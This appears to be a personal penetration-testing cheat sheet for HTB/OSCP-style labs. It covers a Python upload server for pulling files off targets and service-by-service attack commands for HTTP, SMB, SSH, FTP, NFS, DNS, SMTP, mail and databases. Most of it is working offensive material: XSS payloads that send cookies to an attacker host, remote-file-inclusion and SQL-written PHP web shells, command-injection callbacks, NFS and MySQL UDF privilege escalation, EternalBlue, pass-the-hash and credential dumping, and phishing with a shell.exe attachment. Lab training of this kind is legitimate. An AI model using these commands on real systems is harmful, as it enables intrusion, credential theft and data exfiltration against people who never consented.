
---
#  [OG-1] Python virtual env `[venv]`

##  venv 

```bash
sudo apt update
sudo apt install python3-venv
```
```bash
python3 -m venv venv
```
```bash
source venv/bin/activate
```

##  Deactivate

```bash
deactivate
```
# Windows

##  Check Python installed

```powershell
python --version
```
##  Create virtual environment

```powershell
python -m venv venv
```
## Activate it

### PowerShell:

```powershell
venv\Scripts\Activate.ps1
```
### CMD:

```cmd
venv\Scripts\activate.bat
```
## If PowerShell blocks it

Run:

```powershell
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
```
Then activate again.

##  Deactivate

```powershell
deactivate
```
# 🔍 Verify it's working

```bash
which python
```

Should point to:

```bash
./venv/bin/python
```

# 🎯 Minimal workflow

```bash
python3 -m venv venv
source venv/bin/activate
```


#  [OG-2] Python HTTP Upload-Server
##  Python Upload Server

```bash
#!/usr/bin/env python3
import http.server
import sys
import os

class UploadHandler(http.server.SimpleHTTPRequestHandler):

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"""
            <html><body>
            <h2>Upload File</h2>
            <form method="POST" enctype="multipart/form-data">
                <input type="file" name="file"><br><br>
                <input type="submit" value="Upload">
            </form>
            </body></html>
        """)

    def do_POST(self):
        try:
            content_length = int(self.headers['Content-Length'])
            data = self.rfile.read(content_length)

            content_type = self.headers.get('Content-Type')
            if not content_type or "boundary=" not in content_type:
                raise Exception("Invalid Content-Type")

            boundary = content_type.split("boundary=")[1].encode()
            parts = data.split(b'--' + boundary)

            for part in parts:
                if b'Content-Disposition' in part and b'filename=' in part:

                    header_line = part.split(b'\r\n')[1].decode()
                    filename = header_line.split('filename="')[1].split('"')[0]

                    # Prevent directory traversal
                    filename = os.path.basename(filename)

                    file_data = part.split(b'\r\n\r\n')[1].rsplit(b'\r\n', 1)[0]

                    with open(filename, "wb") as f:
                        f.write(file_data)

                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(f"Uploaded: {filename}\n".encode())
                    return

            raise Exception("No file found in request")

        except Exception as e:
            self.send_response(400)
            self.end_headers()
            self.wfile.write(f"Upload failed: {str(e)}\n".encode())


if __name__ == "__main__":

    # Default port
    port = 8000

    # Allow custom port from CLI
    if len(sys.argv) > 1:
        try:
            port = int(sys.argv[1])
        except ValueError:
            print("[!] Invalid port. Using default 8000")

    server = http.server.HTTPServer(('0.0.0.0', port), UploadHandler)

    print(f" Upload server running on http://0.0.0.0:{port}")
    print(f" Files will be saved in: {os.getcwd()}")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Server stopped")
```

Run on your **attacker machine**:

## Custom port
```bash
python3 upload_server.py
```
```bash
python3 upload.py 80
```
Server will listen on:

```bash
http://YOUR_IP:8000
```
```bash
http://YOUR_IP:80
```
---

#  Linux Upload Methods

##  Method 1 — curl (recommended)

```bash
curl -X POST http://YOUR_IP:<Port> -F "file=@filename"
```

### Example:

```bash
curl -X POST http://192.168.49.51:8000 -F "file=@db.sqlite3"
```

---

##  Method 2 — Python (if curl not available)

```bash
python3 -c "import requests; requests.post('http://YOUR_IP:<Port>', files={'file': open('filename','rb')})"
```

---

##  Notes

* MUST use `@` before filename
* Ensure correct IP (tun0 interface)
* File will be saved in server directory

---

#  Windows Upload Methods

##  Method 1 — PowerShell (recommended)

```powershell
Invoke-WebRequest -Uri "http://YOUR_IP:8000" -Method POST -Form @{file=Get-Item "C:\path\to\file"}
```

### Example:

```powershell
Invoke-WebRequest -Uri "http://192.168.49.51:8000" -Method POST -Form @{file=Get-Item "C:\Users\user\db.sqlite3"}
```

---

##  Method 2 — curl (Windows 10+)

```powershell
curl -X POST http://YOUR_IP:8000 -F "file=@C:\path\to\file"
```

---

##  Method 3 — Python

```powershell
python -c "import requests; requests.post('http://YOUR_IP:8000', files={'file': open('file','rb')})"
```

---

#  Typical HTB Workflow

## 1. Start server (attacker)

```bash
python3 upload_server.py
```

---

## 2. From target machine

```bash
curl -X POST http://ATTACKER_IP:8000 -F "file=@/path/to/file"
```

---

## 3. Receive file

```bash
Upload successful!
```
```
```
## [OG-4] 1. Reconnaissance & Enumeration

### Host Discovery
```bash
# Ping sweep
nmap -sn 192.168.1.0/24
netdiscover -r 192.168.1.0/24
arp-scan -l

# Single host alive check
ping -c 3 <IP>
fping -a -g 192.168.1.0/24 2>/dev/null
```

### Port Scanning — Nmap
```bash
# Full TCP fast scan (OSCP standard)
nmap -sC -sV -oA full_scan <IP>

# All ports
nmap -p- --min-rate=5000 -T4 <IP>

# Top 1000 UDP
nmap -sU --top-ports=1000 <IP>

# Specific port deep scan
nmap -p 80,443,8080 -sV -sC -A <IP>

# OS detection
nmap -O <IP>

# Aggressive scan
nmap -A -T4 <IP>

# Firewall/IDS evasion
nmap -sS -Pn -f --data-length 200 <IP>         # Fragment packets
nmap -D RND:10 <IP>                             # Decoy scan
nmap --source-port 53 <IP>                      # Spoof source port
nmap -sI <zombie_IP> <target_IP>                # Idle/zombie scan

# Scan from file
nmap -iL targets.txt -sV -oA scan_results

# Useful NSE scripts
nmap --script=default,vuln <IP>
nmap --script=banner <IP>
nmap --script=http-enum <IP>
nmap --script=smb-vuln* <IP>
nmap --script=ftp-anon,ftp-brute <IP>
```

### Masscan
```bash
masscan -p1-65535 <IP> --rate=10000
masscan -p1-65535,U:1-65535 <IP> --rate=5000 -oG masscan.txt
```

### Autorecon (highly recommended for OSCP)
```bash
autorecon <IP>
autorecon <IP> --single-target
autorecon 192.168.1.0/24
```

### Gobuster / Feroxbuster / Dirb
```bash
# Gobuster dir
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50

# Gobuster vhost
gobuster vhost -u http://<domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Gobuster DNS
gobuster dns -d <domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Feroxbuster (recursive)
feroxbuster -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -r

# Dirb
dirb http://<IP>/ /usr/share/wordlists/dirb/common.txt

# FFUF
ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,301,302,403
ffuf -u http://<IP>/FUZZ -w wordlist.txt -e .php,.html,.txt,.bak,.old
ffuf -u http://<IP>/ -H "Host: FUZZ.<domain>" -w subdomains.txt -mc 200   # vhost fuzzing
```

---

## [OG-5] 2. HTTP / HTTPS

### Manual Enumeration
```bash
# Banner grab
curl -v http://<IP>
curl -I http://<IP>                          # Headers only
curl -L http://<IP>                          # Follow redirects
curl -k https://<IP>                         # Ignore SSL errors
wget --server-response --spider http://<IP>  # Spider headers

# View page source
curl http://<IP>/robots.txt
curl http://<IP>/sitemap.xml
curl http://<IP>/.well-known/security.txt

# Check common files
curl http://<IP>/.htaccess
curl http://<IP>/crossdomain.xml
curl http://<IP>/phpinfo.php
curl http://<IP>/web.config
curl http://<IP>/wp-config.php
curl http://<IP>/config.php
curl http://<IP>/.env
curl http://<IP>/backup.zip
curl http://<IP>/admin/ 
curl http://<IP>/login/
```

### Nikto
```bash
nikto -h http://<IP>
nikto -h http://<IP> -port 8080
nikto -h http://<IP> -ssl                  # HTTPS
nikto -h http://<IP> -o nikto_output.txt
```

### WhatWeb
```bash
whatweb http://<IP>
whatweb -a 3 http://<IP>                    # Aggressive
whatweb -v http://<IP>                      # Verbose
```

### WordPress
```bash
wpscan --url http://<IP>
wpscan --url http://<IP> --enumerate u      # Enumerate users
wpscan --url http://<IP> --enumerate p      # Enumerate plugins
wpscan --url http://<IP> --enumerate t      # Enumerate themes
wpscan --url http://<IP> -P /usr/share/wordlists/rockyou.txt -U admin   # Bruteforce

# Manual WP enumeration
curl http://<IP>/wp-json/wp/v2/users        # List users via API
curl http://<IP>/?author=1                  # Author ID bruteforce
```

### SQL Injection
```bash
# Manual test strings
'
''
`
``
,
"
""
/
//
\\
;
' or '1'='1
' or '1'='1'--
' or '1'='1'/*
" or "1"="1
" or "1"="1"--
admin'--
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
1' ORDER BY 1--
1' ORDER BY 2--
1' ORDER BY 3--
1' UNION SELECT null--
1' UNION SELECT null,null--
1' UNION SELECT null,null,null--

# SQLMap
sqlmap -u "http://<IP>/index.php?id=1" --dbs
sqlmap -u "http://<IP>/index.php?id=1" -D <dbname> --tables
sqlmap -u "http://<IP>/index.php?id=1" -D <dbname> -T <table> --dump
sqlmap -u "http://<IP>/login.php" --data="user=admin&pass=test" --dbs
sqlmap -u "http://<IP>/index.php?id=1" --os-shell
sqlmap -u "http://<IP>/index.php?id=1" --file-read "/etc/passwd"
sqlmap -u "http://<IP>/index.php?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
sqlmap -r request.txt --dbs                 # From Burp saved request
sqlmap -u "http://<IP>/" --cookie="PHPSESSID=xxx" --dbs   # With cookies
sqlmap -u "http://<IP>/index.php?id=1" --level=5 --risk=3 --dbs
```

### XSS
```bash
# Test payloads
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
<body onload=alert(1)>
javascript:alert(1)
<iframe src="javascript:alert(1)">

# Cookie stealing
<script>document.location='http://<attacker_IP>/steal?c='+document.cookie</script>
<img src=x onerror="fetch('http://<attacker_IP>/?c='+document.cookie)">

# Start listener for stolen cookies
nc -lvnp 80
python3 -m http.server 80
```

### File Inclusion (LFI / RFI)
```bash
# LFI test
http://<IP>/index.php?page=../../../../etc/passwd
http://<IP>/index.php?page=../../../../etc/shadow
http://<IP>/index.php?page=../../../../windows/win.ini
http://<IP>/index.php?page=../../../../windows/system32/drivers/etc/hosts

# Null byte bypass (PHP < 5.3)
http://<IP>/index.php?page=../../../../etc/passwd%00

# Path traversal tricks
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
..%252F..%252F..%252Fetc%252Fpasswd         # Double URL encode

# PHP wrappers for LFI
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
php://input                                 # Combine with POST data
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=   # <?php system($_GET['cmd']);?>

# Log poisoning -> LFI RCE
# 1. Poison SSH log
ssh '<?php system($_GET["cmd"]); ?>'@<IP>
# 2. Include log
http://<IP>/index.php?page=/var/log/auth.log&cmd=id

# Apache log poisoning
curl -A "<?php system(\$_GET['cmd']); ?>" http://<IP>/
http://<IP>/index.php?page=/var/log/apache2/access.log&cmd=id

# PHP session poisoning
# Login and set session value to payload
http://<IP>/index.php?page=/var/lib/php/sessions/sess_<SESSION_ID>

# RFI
http://<IP>/index.php?page=http://<attacker_IP>/shell.php
http://<IP>/index.php?page=\\<attacker_IP>\share\shell.php

# LFI to RCE via /proc/self/environ
http://<IP>/index.php?page=/proc/self/environ
# (Need to inject PHP code in User-Agent first)
```

### File Upload Bypass
```bash
# Extension bypasses
shell.php
shell.php5
shell.php4
shell.php3
shell.phtml
shell.pHp
shell.PHP
shell.php.jpg
shell.jpg.php
shell.asp
shell.aspx
shell.ashx
shell.jsp

# MIME type bypass — change Content-Type in Burp
Content-Type: image/jpeg

# Magic bytes bypass — prepend image header to PHP
echo -e '\xFF\xD8\xFF\xE0' > shell.php.jpg && cat shell.php >> shell.php.jpg

# Double extension with null byte
shell.php%00.jpg

# .htaccess upload to allow PHP execution
echo "AddType application/x-httpd-php .jpg" > .htaccess
```

### Command Injection
```bash
# Test payloads
;id
|id
||id
&&id
`id`
$(id)
;ls -la
| ls -la
& whoami
; cat /etc/passwd

# Blind OS injection
; ping -c 5 <attacker_IP>
; curl http://<attacker_IP>/
; wget http://<attacker_IP>/

# Windows
& whoami
| whoami
&& whoami
; whoami
cmd /c whoami
powershell -c whoami
```

### SSRF (Server Side Request Forgery)
```bash
# Basic
http://localhost/
http://127.0.0.1/
http://[::1]/
http://0.0.0.0/
http://0/

# Internal services
http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:6379

# AWS Metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Bypass filters
http://0x7f000001/            # Hex IP
http://2130706433/            # Decimal IP
http://127.1/                 # Short IP
http://spoofed.domain/        # DNS that resolves to 127.0.0.1
```

### HTTP Verb Tampering
```bash
curl -X OPTIONS http://<IP>/
curl -X PUT http://<IP>/shell.php -d "<?php system(\$_GET['cmd']); ?>"
curl -X TRACE http://<IP>/
curl -X DELETE http://<IP>/file.txt
```

### Burp Suite Key Shortcuts
```
Ctrl+I         → Send to Intruder
Ctrl+R         → Send to Repeater
Ctrl+Shift+R   → Send to Scanner
Ctrl+Z         → Undo
```

---

## [OG-6] 3. SSH

### Enumeration
```bash
# Version detection
nmap -sV -p 22 <IP>
nc -nv <IP> 22
ssh -V

# NSE scripts
nmap --script=ssh-auth-methods --script-args="ssh.user=root" -p 22 <IP>
nmap --script=ssh-hostkey -p 22 <IP>
nmap --script=ssh2-enum-algos -p 22 <IP>
```

### Authentication
```bash
# Password login
ssh user@<IP>
ssh -p 2222 user@<IP>          # Non-standard port
ssh -l user <IP>               # Alternative syntax

# Key-based login
ssh -i id_rsa user@<IP>
chmod 600 id_rsa               # Required permissions!
ssh -i id_rsa -p 2222 user@<IP>

# Generate SSH key pair
ssh-keygen -t rsa -b 4096 -f my_key
# Add public key to target
echo "$(cat my_key.pub)" >> /home/user/.ssh/authorized_keys
```

### Brute Force
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<IP>
hydra -L users.txt -P passwords.txt ssh://<IP>
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 ssh://<IP> -f

medusa -u root -P /usr/share/wordlists/rockyou.txt -h <IP> -M ssh

ncrack -p 22 --user root -P /usr/share/wordlists/rockyou.txt <IP>

patator ssh_login host=<IP> user=root password=FILE0 0=/usr/share/wordlists/rockyou.txt
```

### SSH Tunneling
```bash
# Local port forward (access remote service locally)
ssh -L 8080:127.0.0.1:80 user@<IP>           # Access via localhost:8080
ssh -L 3306:127.0.0.1:3306 user@<IP>         # MySQL tunneled
ssh -L 8080:<internal_host>:80 user@<pivot>  # Jump through pivot

# Remote port forward (expose local service to remote)
ssh -R 4444:127.0.0.1:4444 user@<IP>         # Attacker's shell forwarded
ssh -R 8080:127.0.0.1:80 user@<IP>

# Dynamic port forward (SOCKS proxy)
ssh -D 1080 user@<IP>
# Then use with proxychains:
# proxychains nmap -sT 192.168.1.0/24

# Keep alive / no command
ssh -N -f -L 8080:127.0.0.1:80 user@<IP>    # Background, no command

# SSH jump host
ssh -J user@<pivot> user@<target>
ssh -o ProxyJump=user@<pivot> user@<target>
```

### SSH Key Cracking
```bash
# Extract hash from encrypted private key
python3 /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt

hashcat -m 22921 id_rsa.hash /usr/share/wordlists/rockyou.txt
```

### SSH Tricks
```bash
# Execute single command
ssh user@<IP> "id; uname -a; cat /etc/passwd"

# Transfer files via SSH
scp file.txt user@<IP>:/tmp/
scp user@<IP>:/etc/passwd ./passwd
scp -r /local/dir user@<IP>:/remote/dir

# SFTP
sftp user@<IP>
sftp> get /etc/passwd
sftp> put shell.php /var/www/html/

# Disable host key checking (useful in CTF)
ssh -o StrictHostKeyChecking=no user@<IP>
ssh -o UserKnownHostsFile=/dev/null user@<IP>

# Use weak ciphers on old targets
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 user@<IP>
ssh -c aes128-cbc user@<IP>
```

---

## [OG-7] 4. FTP

### Enumeration
```bash
nmap -sV -p 21 <IP>
nmap --script=ftp-anon,ftp-brute,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor -p 21 <IP>
nmap --script=ftp-vuln* -p 21 <IP>
```

### Anonymous Login
```bash
ftp <IP>
# Username: anonymous
# Password: anonymous OR blank OR email@email.com

# Automated check
nmap --script=ftp-anon -p 21 <IP>
```

### FTP Commands
```bash
ftp <IP>
ftp> help                     # List commands
ftp> ls                       # List files
ftp> ls -la                   # List hidden files
ftp> cd <dir>                 # Change directory
ftp> pwd                      # Print working directory
ftp> get <file>               # Download file
ftp> mget *                   # Download all files
ftp> put <file>               # Upload file
ftp> mput *.php               # Upload multiple
ftp> binary                   # Binary transfer mode (important!)
ftp> ascii                    # ASCII mode
ftp> passive                  # Toggle passive mode
ftp> quit / bye               # Exit

# Recursive download all
wget -m --no-passive ftp://anonymous:anonymous@<IP>
wget -r ftp://user:pass@<IP>/

# cURL
curl ftp://<IP>/ --user anonymous:anonymous
curl ftp://<IP>/file.txt --user user:pass -o file.txt
curl ftp://<IP>/ -u user:pass --list-only
```

### Brute Force
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<IP>
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://<IP>
medusa -u admin -P /usr/share/wordlists/rockyou.txt -h <IP> -M ftp
ncrack -p 21 --user admin -P /usr/share/wordlists/rockyou.txt <IP>
```

### vsFTPd 2.3.4 Backdoor
```bash
# Manual trigger - smiley face in username activates backdoor on port 6200
telnet <IP> 21
USER user:)
PASS password
# Then connect to port 6200
telnet <IP> 6200

# Metasploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <IP>
run
```

### ProFTPD Exploits
```bash
# ProFTPD 1.3.5 - File Copy (mod_copy)
nmap --script=ftp-proftpd-backdoor -p 21 <IP>

# Manual mod_copy
nc -n <IP> 21
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/passwd.txt
# Then browse to http://<IP>/passwd.txt
```

---

## [OG-8] 5. SMB

### SMB Mindset
> **SMB = enumerate → access → loot → write → exploit**
> Don’t think: “What is this output?” 
> Think: “Where is my entry point?”

### Decision Tree (MEMORIZE THIS)

1. **Can I login anonymously?** (`smbclient -L //<IP>/ -N`)
2. **Any shares?** 
   - YES → access them
   - NO → enum users
3. **Can I read files?** → YES → dump everything
4. **Can I write?** → YES → upload shell
5. **Old version?** → YES → searchsploit

---

### Enumeration
```bash
# Nmap
nmap --script=smb-vuln*,smb-enum-shares,smb-enum-users,smb-os-discovery -p 139,445 <IP>
nmap -p 445 --script=smb2-security-mode <IP>

# SMBClient
smbclient -L //<IP>/ -N                   # List shares (null auth)
smbclient -L //<IP>/ -U guest             # Guest auth
smbclient -L //<IP>/ -U user%password     # Authenticated
smbclient //<IP>/share -N                 # Connect to share
smbclient //<IP>/share -U user%pass

# SMB commands inside session
smb> ls
smb> cd <dir>
smb> get <file>
smb> put <file>
smb> mget *
smb> recurse ON
smb> prompt OFF
smb> mget *                               # Download everything recursively

# smbmap
smbmap -H <IP>                            # List shares
smbmap -H <IP> -u '' -p ''               # Null session
smbmap -H <IP> -u guest                  # Guest
smbmap -H <IP> -u user -p pass -d domain
smbmap -H <IP> -r <share>                # List contents recursively
smbmap -H <IP> -u user -p pass --download 'share\file.txt'
smbmap -H <IP> -u user -p pass --upload 'shell.exe' 'C$\temp\shell.exe'

# Enum4linux
enum4linux -a <IP>                        # All enumeration
enum4linux -u <user> -p <pass> -a <IP>   # Authenticated

# Enum4linux-ng (newer)
enum4linux-ng -A <IP>
enum4linux-ng -A <IP> -u user -p pass

# CrackMapExec
crackmapexec smb <IP>
crackmapexec smb <IP> -u '' -p ''        # Null session
crackmapexec smb <IP> -u user -p pass --shares
crackmapexec smb <IP> -u user -p pass --users
crackmapexec smb <IP> -u user -p pass --groups
crackmapexec smb <IP> -u user -p pass --rid-brute
crackmapexec smb <IP>/24 -u user -p pass # Subnet scan
crackmapexec smb <IP> -u user -H <NTLM_hash>   # Pass the Hash
crackmapexec smb <IP> -u users.txt -p pass --continue-on-success
```

### SMB Vulnerabilities
```bash
# EternalBlue (MS17-010) — Windows 7/2008 R2
nmap --script=smb-vuln-ms17-010 -p 445 <IP>

# Metasploit EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
set RHOST <IP>
set LHOST <attacker_IP>
run

# Manual EternalBlue
git clone https://github.com/3ndG4me/AutoBlue-MS17-010
python eternal_checker.py <IP>
python zzz_exploit.py <IP>

# MS08-067 (Windows XP/2003)
nmap --script=smb-vuln-ms08-067 -p 445 <IP>
use exploit/windows/smb/ms08_067_netapi

# SambaCry (CVE-2017-7494)
nmap --script=smb-vuln-cve-2017-7494 -p 445 <IP>
use exploit/linux/samba/is_known_pipename

# PrintNightmare (CVE-2021-1675 / CVE-2021-34527)
impacket-rpcdump <IP> | grep -E 'MS-RPRN|MS-PAR'
# Check if spooler running
crackmapexec smb <IP> -u user -p pass -M printnightmare
```

### Mount SMB Share
```bash
# Linux
mkdir /mnt/smb
mount -t cifs //<IP>/share /mnt/smb -o username=user,password=pass
mount -t cifs //<IP>/share /mnt/smb -o username=guest,password=

# With credentials file
echo "username=user
password=pass
domain=WORKGROUP" > ~/.smbcreds
mount -t cifs //<IP>/share /mnt/smb -o credentials=~/.smbcreds
```

### Responder (LLMNR/NBT-NS Poisoning)
```bash
responder -I eth0 -rdwv
responder -I eth0 -A                   # Analyze mode (passive)

# Crack captured NTLMv2 hashes
hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt ntlmv2.hash
```

### Impacket SMB Tools
```bash
# psexec — get shell via SMB + writable share
impacket-psexec user:pass@<IP>
impacket-psexec -hashes :NTLMhash user@<IP>         # Pass the Hash

# smbexec — no binary upload required
impacket-smbexec user:pass@<IP>

# wmiexec — WMI execution
impacket-wmiexec user:pass@<IP>
impacket-wmiexec -hashes :NTLMhash user@<IP>

# atexec — Task Scheduler
impacket-atexec user:pass@<IP> whoami

# Dump SAM/NTDS
impacket-secretsdump user:pass@<IP>
impacket-secretsdump -hashes :NTLMhash user@<IP>
impacket-secretsdump -just-dc-ntlm domain/user:pass@DC_IP
```

---

## [OG-9] 6. NFS

### Enumeration
```bash
nmap -sV -p 111,2049 <IP>
nmap --script=nfs-ls,nfs-showmount,nfs-statfs -p 111,2049 <IP>
rpcinfo -p <IP>
showmount -e <IP>                         # List NFS exports
```

### Mount NFS Share
```bash
mkdir /mnt/nfs
mount -t nfs <IP>:/share /mnt/nfs -o nolock
mount -t nfs <IP>:/ /mnt/nfs             # Mount root (dangerous if world-readable!)
mount -t nfs4 <IP>:/share /mnt/nfs

# List exports
showmount -e <IP>

# Unmount
umount /mnt/nfs
```

### NFS Privilege Escalation
```bash
# If no_root_squash is set on the export:
cat /etc/exports
# Look for: /share *(rw,no_root_squash)

# On attacker machine (as root):
mount -t nfs <IP>:/share /mnt/nfs
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash           # Set SUID bit

# On victim machine:
/share/bash -p                   # Execute with root privileges
```

---

## [OG-10] 7. DNS

### Enumeration
```bash
# Basic queries
nslookup <domain>
nslookup -type=MX <domain>
nslookup -type=NS <domain>
nslookup -type=TXT <domain>
nslookup -type=AAAA <domain>
nslookup -type=SOA <domain>

# dig
dig <domain>
dig <domain> MX
dig <domain> NS
dig <domain> TXT
dig <domain> SOA
dig <domain> AAAA
dig @<nameserver> <domain> ANY
dig +short <domain>

# Reverse lookup
dig -x <IP>
nslookup <IP>

# Zone transfer
dig axfr <domain> @<nameserver>
host -l <domain> <nameserver>
fierce --domain <domain> --dns-servers <nameserver>

# DNS brute force
dnsenum --dnsserver <nameserver> -f /usr/share/wordlists/dnsmap.txt <domain>
dnsrecon -d <domain> -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt
fierce --domain <domain>
gobuster dns -d <domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# dnsrecon
dnsrecon -d <domain>                      # All record types
dnsrecon -d <domain> -t axfr             # Zone transfer
dnsrecon -d <domain> -t brt -D wordlist  # Brute force
dnsrecon -r <IP>/<CIDR>                  # Reverse lookup range
```

### DNS Cache Snooping
```bash
dig @<dns_server> <domain> A +norecurse   # Check if cached
```

### DNS Recon
```bash
# Sublist3r
sublist3r -d <domain>
sublist3r -d <domain> -b -p 80,443       # Bruteforce + ports

# amass
amass enum -d <domain>
amass enum -passive -d <domain>
```

---

## [OG-11] 8. SMTP

### Enumeration
```bash
nmap -sV -p 25,465,587 <IP>
nmap --script=smtp-commands,smtp-enum-users,smtp-open-relay,smtp-vuln* -p 25 <IP>

# Banner grab
nc -nv <IP> 25
telnet <IP> 25
```

### SMTP Commands
```bash
# Manual interaction
nc -nv <IP> 25
EHLO attacker.com
HELO attacker.com
VRFY root                                 # Verify if user exists
VRFY admin
EXPN root                                 # Expand mailing list
EXPN users
RCPT TO:<user@domain>                     # Test recipient
MAIL FROM:<test@test.com>
DATA
Subject: Test
Test message.
.
QUIT
```

### User Enumeration
```bash
# smtp-user-enum tool
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t <IP>
smtp-user-enum -M EXPN -U users.txt -t <IP>
smtp-user-enum -M RCPT -U users.txt -t <IP> -D <domain>

# Metasploit
use auxiliary/scanner/smtp/smtp_enum
set RHOST <IP>
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
run
```

### Send Email
```bash
# swaks — Swiss Army Knife for SMTP
swaks --to user@<domain> --from attacker@<domain> --server <IP>
swaks --to user@<domain> --from admin@<domain> --server <IP> --body "Click: http://<attacker>" --header "Subject: Important"

# With attachment
swaks --to user@<domain> --server <IP> --attach shell.exe --header "Subject: Invoice"
```

### Open Relay Test
```bash
nmap --script=smtp-open-relay -p 25 <IP>
# Manual test
nc -nv <IP> 25
EHLO test.com
MAIL FROM:<attacker@external.com>
RCPT TO:<victim@external.com>            # Relay attempt
DATA
Subject: Relay Test
Test.
.
```

---

## [OG-12] 9. POP3 / IMAP

### POP3 (Port 110)
```bash
# Enumeration
nmap -sV -p 110 <IP>
nmap --script=pop3-capabilities,pop3-brute -p 110 <IP>

# Manual interaction
nc -nv <IP> 110
telnet <IP> 110
USER <username>
PASS <password>
LIST                                     # List messages
RETR 1                                   # Retrieve message 1
RETR 2
DELE 1                                   # Delete message 1
STAT                                     # Mailbox statistics
QUIT

# SSL/TLS
openssl s_client -connect <IP>:995
```

### IMAP (Port 143)
```bash
# Enumeration
nmap -sV -p 143,993 <IP>
nmap --script=imap-capabilities,imap-brute -p 143 <IP>

# Manual interaction
nc -nv <IP> 143
telnet <IP> 143
A LOGIN <user> <pass>
A LIST "" "*"                            # List mailboxes
A SELECT INBOX                           # Select inbox
A FETCH 1 FULL                           # Fetch message 1 full
A FETCH 1 BODY[TEXT]                     # Fetch message body
A SEARCH ALL                             # Search all messages
A LOGOUT

# SSL/TLS
openssl s_client -connect <IP>:993
```

### Brute Force
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt pop3://<IP>
hydra -l user -P /usr/share/wordlists/rockyou.txt imap://<IP>
```

---

## [OG-13] 10. MySQL

### Enumeration
```bash
nmap -sV -p 3306 <IP>
nmap --script=mysql-info,mysql-enum,mysql-empty-password,mysql-brute -p 3306 <IP>
nmap --script=mysql-databases --script-args='mysqluser=root,mysqlpass=' -p 3306 <IP>
```

### Authentication
```bash
# Local
mysql -u root -p
mysql -u root -p<password>               # No space between -p and password
mysql -u root --password=pass

# Remote
mysql -u root -p -h <IP>
mysql -u root -p -h <IP> -P 3306

# No password
mysql -u root -h <IP>
mysql -u '' -h <IP>
```

### MySQL Enumeration Queries
```sql
-- Version and info
SELECT version();
SELECT @@version;
SELECT @@datadir;
SELECT @@hostname;
SELECT @@global.secure_file_priv;
SHOW VARIABLES LIKE 'secure_file_priv';

-- Users
SELECT user, host, authentication_string FROM mysql.user;
SELECT user, host, password FROM mysql.user;    -- Older versions
SELECT current_user();

-- Databases
SHOW DATABASES;
USE <database>;
SHOW TABLES;
DESCRIBE <table>;

-- Data
SELECT * FROM <table>;
SELECT column1,column2 FROM <table>;

-- Hashes
SELECT user, authentication_string FROM mysql.user;
```

### MySQL File Operations
```sql
-- Read files (requires FILE privilege)
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');

-- Write files (requires FILE privilege + write permission)
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
SELECT "<?php system($_GET['cmd']); ?>" INTO DUMPFILE '/var/www/html/shell.php';

-- Check write permissions
SHOW VARIABLES LIKE 'secure_file_priv';   -- Empty = anywhere allowed
```

### MySQL UDF Privilege Escalation
```bash
# Check if UDF is possible
# MySQL < 5.1: /usr/lib/
# MySQL >= 5.1: plugin_dir

show variables like '%plugin%';

# Compile and upload UDF
searchsploit mysql udf
cp /usr/share/exploitdb/exploits/linux/local/1518.c .
gcc -g -c 1518.c
gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lc

# Upload via SQL
use mysql;
create table npn(line blob);
insert into npn values(load_file('/tmp/1518.so'));
select * from npn into dumpfile '/usr/lib/mysql/plugin/1518.so';
create function do_system returns integer soname '1518.so';
select do_system('chmod +s /bin/bash');
```

### Credential Files
```bash
# Common config file locations
cat /var/www/html/config.php
cat /var/www/html/wp-config.php
cat /etc/mysql/my.cnf
cat /etc/mysql/mysql.conf.d/mysqld.cnf
cat ~/.mysql_history
```

---

## [OG-14] 11. PostgreSQL

### Enumeration
```bash
nmap -sV -p 5432 <IP>
nmap --script=pgsql-brute -p 5432 <IP>
```

### Authentication
```bash
psql -h <IP> -U postgres
psql -h <IP> -U postgres -p 5432
psql -h <IP> -U postgres -d <database>
psql "postgresql://postgres:pass@<IP>:5432/postgres"

# Default creds
# postgres:postgres
# postgres:(blank)
```

